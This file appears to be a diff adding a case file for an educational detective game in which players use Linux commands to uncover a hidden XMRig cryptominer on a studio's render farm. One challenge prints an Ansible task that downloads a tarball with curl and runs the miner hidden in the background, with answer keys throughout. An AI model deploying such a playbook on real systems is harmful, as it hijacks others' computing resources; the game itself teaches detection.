@@ -1,0 +1,380 @@
+# Murder Mystery Case 005: The Rogue Process
+# A cryptocurrency mining sabotage
+
+case:
+  id: "case_005"
+  title: "The Rogue Process"
+  subtitle: "Something is Eating the CPU"
+  difficulty: "intermediate"
+  estimated_time: "20-30 minutes"
+
+  intro: |
+    The game studio's servers are on fire. Not literally, but close.
+
+    "Our render farm is at 100% CPU - all 500 nodes," the CTO explains.
+    "We can't compile builds. We're going to miss our launch deadline."
+
+    "Malware?" you ask.
+
+    "That's the thing. Every scan comes up clean. But something is
+    running. Something hidden. We need you to find it."
+
+    A ghost in the machine. Your favorite kind of hunt.
+
+  setting: |
+    Pixel Dreams Studio - AAA game developer, 500 render nodes.
+    The problem: All servers at 100% CPU for 3 days.
+    The mystery: No malware detected, but something is running.
+
+    $50 million launch at stake. Find the rogue process.
+
+suspects:
+  - id: "derek"
+    name: "Derek Simmons"
+    role: "DevOps Engineer"
+    description: "Manages all server infrastructure"
+    alibi: "Claims he's been trying to fix the problem"
+    motive: "Owns cryptocurrency mining hardware at home"
+
+  - id: "yuki"
+    name: "Yuki Tanaka"
+    role: "Lead Programmer"
+    description: "Genius coder, socially awkward"
+    alibi: "Working 16-hour days on the game"
+    motive: "Upset about crunch time, no bonus promised"
+
+  - id: "brad"
+    name: "Brad Morrison"
+    role: "IT Security"
+    description: "New hire, came from a crypto startup"
+    alibi: "Running security scans constantly"
+    motive: "Previous company went bankrupt, needs money"
+
+  - id: "outsider"
+    name: "Unknown Hacker"
+    role: "External Threat"
+    description: "Could be anyone with server access"
+    alibi: "N/A"
+    motive: "Free electricity for crypto mining"
+
+scenes:
+  - id: "scene_01"
+    title: "The Overloaded Servers"
+    location: "Server Room"
+    narrative: |
+      The server room sounds like a jet engine. Fans at maximum.
+      Temperature warnings flash on every monitor.
+
+      "Show me what's running," you say.
+
+      Derek pulls up a terminal. Time to hunt.
+
+    objective: "Identify the processes consuming CPU"
+
+    challenges:
+      - id: "ch_05_01"
+        context: "See what processes are using the most CPU right now"
+        question_type: "command_builder"
+        question: "Show running processes sorted by CPU usage (highest first)"
+        correct_answers:
+          - "ps aux --sort=-%cpu | head"
+          - "ps aux --sort=-%cpu"
+          - "top -bn1 | head -20"
+        hint: "ps aux with --sort=-%cpu sorts by CPU descending"
+        success_narrative: |
+          Top processes:
+
+          USER       %CPU  COMMAND
+          render     98.2  /usr/lib/systemd/systemd-helper
+          render     97.8  /usr/lib/systemd/systemd-helper
+          render     97.5  /usr/lib/systemd/systemd-helper
+          ...
+
+          Wait - systemd-helper? That's not a real systemd process!
+          Someone disguised their malware to look like a system service.
+        clue_unlocked: "Fake 'systemd-helper' processes consuming all CPU"
+
+      - id: "ch_05_02"
+        context: "Find out what this fake systemd-helper really is"
+        question_type: "command_builder"
+        question: "Show the full path and details of the process with highest CPU (use ps with full command)"
+        correct_answers:
+          - "ps aux --sort=-%cpu | head -5"
+          - "ps -eo pid,user,%cpu,cmd --sort=-%cpu | head"
+        hint: "ps with -o cmd or aux shows the full command path"
+        success_narrative: |
+          Process details:
+
+          PID   USER    %CPU  COMMAND
+          8842  render  98.2  /tmp/.cache/.hidden/xmrig --donate-level=0 --url=pool.minexmr.com:443
+
+          XMRIG! It's a cryptocurrency miner!
+          Hidden in /tmp/.cache/.hidden/ to avoid detection.
+          Mining Monero on all 500 render nodes!
+        clue_unlocked: "XMRig cryptocurrency miner hidden in /tmp/.cache/.hidden/"
+
+  - id: "scene_02"
+    title: "The Hidden Installation"
+    location: "Forensic Analysis"
+    narrative: |
+      A cryptocurrency miner, disguised as a system service.
+      Running on 500 machines simultaneously.
+
+      Someone installed this. Someone with access.
+      Let's trace the installation.
+
+    objective: "Find how the miner was installed"
+
+    challenges:
+      - id: "ch_05_03"
+        context: "Check when the hidden directory was created"
+        question_type: "command_builder"
+        question: "Show all files in /tmp/.cache/.hidden/ with timestamps and permissions"
+        correct_answers:
+          - "ls -la /tmp/.cache/.hidden/"
+          - "ls -lah /tmp/.cache/.hidden/"
+        hint: "ls -la shows all files with details including hidden ones"
+        success_narrative: |
+          Contents of /tmp/.cache/.hidden/:
+
+          -rwxr-xr-x  1 render  5.2M Mar 10 02:14 xmrig
+          -rw-r--r--  1 render  1.2K Mar 10 02:14 config.json
+          -rwxr-xr-x  1 render   847 Mar 10 02:13 install.sh
+          -rw-r--r--  1 render   234 Mar 10 02:15 pool_wallet.txt
+
+          All created on March 10 at 2 AM!
+          And there's an install.sh script - that's how it spread!
+        clue_unlocked: "Miner installed on March 10 at 2:14 AM via install.sh"
+
+      - id: "ch_05_04"
+        context: "Check the wallet address to see who's receiving the mining profits"
+        question_type: "command_builder"
+        question: "Display the contents of pool_wallet.txt"
+        correct_answers:
+          - "cat /tmp/.cache/.hidden/pool_wallet.txt"
+        hint: "Use cat to display file contents"
+        success_narrative: |
+          Wallet configuration:
+
+          # XMR Wallet - DO NOT CHANGE
+          wallet: 49qFbT...Km8jP2
+          # Est. earnings: $2,500/day with 500 nodes
+          # Brad's retirement fund :)
+
+          "Brad's retirement fund"!
+          Brad Morrison, the IT Security guy!
+        clue_unlocked: "Wallet file contains comment mentioning 'Brad'"
+
+  - id: "scene_03"
+    title: "The Deployment Script"
+    location: "Infrastructure Logs"
+    narrative: |
+      The wallet file mentions Brad. But we need more proof.
+      How did the miner get on 500 machines simultaneously?
+
+      Someone used the deployment system. Let's check Ansible.
+
+    objective: "Trace the mass deployment"
+
+    challenges:
+      - id: "ch_05_05"
+        context: "Check the Ansible deployment logs for March 10"
+        question_type: "command_builder"
+        question: "Search for entries from March 10 in /var/log/ansible.log"
+        correct_answers:
+          - "grep 'Mar 10' /var/log/ansible.log"
+          - "grep 'Mar  10' /var/log/ansible.log"
+          - "grep '2024-03-10' /var/log/ansible.log"
+        hint: "Use grep to filter for the specific date"
+        success_narrative: |
+          Ansible log entries:
+
+          Mar 10 02:12:33 ansible-deploy: User brad.morrison executed playbook
+          Mar 10 02:12:33 ansible-deploy: Playbook: /home/brad.morrison/maintenance.yml
+          Mar 10 02:12:34 ansible-deploy: Target: all_render_nodes (500 hosts)
+          Mar 10 02:14:55 ansible-deploy: Playbook completed successfully
+
+          Brad deployed something to ALL render nodes at 2 AM!
+        clue_unlocked: "Brad deployed 'maintenance.yml' to all 500 nodes"
+
+      - id: "ch_05_06"
+        context: "Check what Brad's 'maintenance' playbook actually does"
+        question_type: "what_does_it_do"
+        question: |
+          What does this Ansible task do?
+
+          - name: System maintenance
+            shell: |
+              mkdir -p /tmp/.cache/.hidden
+              curl -s http://files.internal/maint.tar | tar -xf - -C /tmp/.cache/.hidden
+              chmod +x /tmp/.cache/.hidden/*
+              nohup /tmp/.cache/.hidden/xmrig >/dev/null 2>&1 &
+            become: yes
+        options:
+          - "Downloads and runs a hidden cryptocurrency miner"
+          - "Cleans up temporary cache files"
+          - "Updates system maintenance scripts"
+          - "Backs up configuration files"
+        correct_answer: "Downloads and runs a hidden cryptocurrency miner"
+        hint: "Look at the curl download, the hidden path, and xmrig being run in background"
+        success_narrative: |
+          The playbook:
+          1. Creates a hidden directory
+          2. Downloads the miner package silently
+          3. Makes it executable
+          4. Runs it in the background with nohup
+
+          Brad deployed a cryptominer to 500 machines using his
+          legitimate admin access!
+        clue_unlocked: "Brad's playbook was designed to deploy hidden miners"
+
+  - id: "scene_04"
+    title: "The Profit Calculation"
+    location: "Mining Pool Analysis"
+    narrative: |
+      Let's see how much Brad has been making.
+      500 render nodes, each with high-end GPUs...
+      That's serious mining power.
+
+    objective: "Calculate the scope of the theft"
+
+    challenges:
+      - id: "ch_05_07"
+        context: "Check how long the miner has been running on each node"
+        question_type: "command_builder"
+        question: "Show how long the xmrig process has been running (process uptime)"
+        correct_answers:
+          - "ps -eo pid,etime,cmd | grep xmrig"
+          - "ps -o pid,etime,comm -C xmrig"
+        hint: "ps with -o etime shows elapsed time since process started"
+        success_narrative: |
+          Process runtime:
+
+          PID   ELAPSED   COMMAND
+          8842  5-02:14:33  xmrig
+
+          5 days, 2 hours, 14 minutes!
+
+          That's 5 days of mining on 500 high-end GPUs.
+          At current rates, approximately $12,500 stolen in electricity
+          and computing resources!
+        clue_unlocked: "Miner running for 5+ days - ~$12,500 in stolen resources"
+
+      - id: "ch_05_08"
+        context: "Check the network traffic to see how much data was sent to the mining pool"
+        question_type: "command_builder"
+        question: "Show network connections to minexmr.com (the mining pool)"
+        correct_answers:
+          - "netstat -an | grep minexmr"
+          - "ss -an | grep minexmr"
+          - "lsof -i | grep minexmr"
+        hint: "netstat or ss shows network connections, grep for the pool name"
+        success_narrative: |
+          Active connections to mining pool:
+
+          tcp  ESTABLISHED  10.0.1.42:54321  pool.minexmr.com:443
+          tcp  ESTABLISHED  10.0.1.43:54322  pool.minexmr.com:443
+          ... (498 more connections)
+
+          500 active connections to the Monero mining pool.
+          Each node sending shares, earning Brad cryptocurrency.
+        clue_unlocked: "500 active connections to mining pool confirmed"
+
+  - id: "scene_05"
+    title: "Termination"
+    location: "IT Security Office"
+    narrative: |
+      Brad Morrison sits at his desk, monitoring "security scans."
+      In reality, he's checking his mining dashboard.
+
+      Time to pull the plug - on his scheme and his processes.
+
+    objective: "Stop the mining and confront Brad"
+
+    challenges:
+      - id: "ch_05_09"
+        context: "Kill all xmrig processes across all nodes using the deployment system"
+        question_type: "command_builder"
+        question: "Write a command to kill all processes named 'xmrig' on the system"
+        correct_answers:
+          - "pkill xmrig"
+          - "killall xmrig"
+          - "pkill -f xmrig"
+        hint: "pkill or killall can kill processes by name"
+        success_narrative: |
+          Executing on all 500 nodes...
+
+          Process terminated: 500 instances
+
+          The fans in the server room slowly wind down.
+          The temperature drops.
+          Brad's dashboard goes red.
+
+          "What the-" he starts.
+
+          "It's over, Brad."
+        clue_unlocked: "All mining processes terminated"
+
+      - id: "ch_05_10"
+        context: "Secure the evidence by archiving Brad's home directory and the miner files"
+        question_type: "command_builder"
+        question: "Create a tar archive of /home/brad.morrison/ and /tmp/.cache/.hidden/ together"
+        correct_answers:
+          - "tar -czvf brad_evidence.tar.gz /home/brad.morrison/ /tmp/.cache/.hidden/"
+          - "tar czvf brad_evidence.tar.gz /home/brad.morrison /tmp/.cache/.hidden"
+        hint: "tar can archive multiple directories in one command"
+        success_narrative: |
+          Evidence archived:
+
+          brad_evidence.tar.gz - 847 MB
+
+          Brad stares at his frozen mining dashboard.
+
+          "I thought crypto would solve everything," he mutters.
+          "My last startup went bankrupt. I had debts. The mining
+          was supposed to be temporary, just until I got back on my feet."
+
+          "On the company's electricity bill?"
+
+          He has no answer.
+        clue_unlocked: "Brad confessed - used company resources for personal crypto mining"
+
+conclusion:
+  success: |
+    CASE CLOSED
+
+    Brad Morrison was terminated and charged with:
+    - Theft of computing resources ($12,500+)
+    - Unauthorized system access
+    - Installation of unauthorized software
+    - Breach of employment contract
+
+    The evidence was overwhelming:
+    - Disguised xmrig processes on all servers
+    - His name in the wallet configuration
+    - Ansible logs showing his deployment
+    - Network traffic to mining pools
+    - His playbook containing the installation code
+
+    The render farm recovered immediately.
+    Pixel Dreams launched their game on time.
+
+    Evidence collected: {clues_found}/{total_clues}
+    Time taken: {time_taken}
+
+    The rogue process was terminated permanently.
+
+  failure: |
+    Without enough evidence, Brad had time to clean up.
+    He claimed the mining was a "test" for security vulnerabilities.
+
+    The company couldn't prove intent.
+    Brad walked away with his cryptocurrency.
+
+    Always check your processes, Detective.
+
+rewards:
+  xp: 550
+  achievement: "process_hunter"
+  achievement_name: "Process Hunter"
+  achievement_description: "Tracked down a hidden cryptocurrency miner"
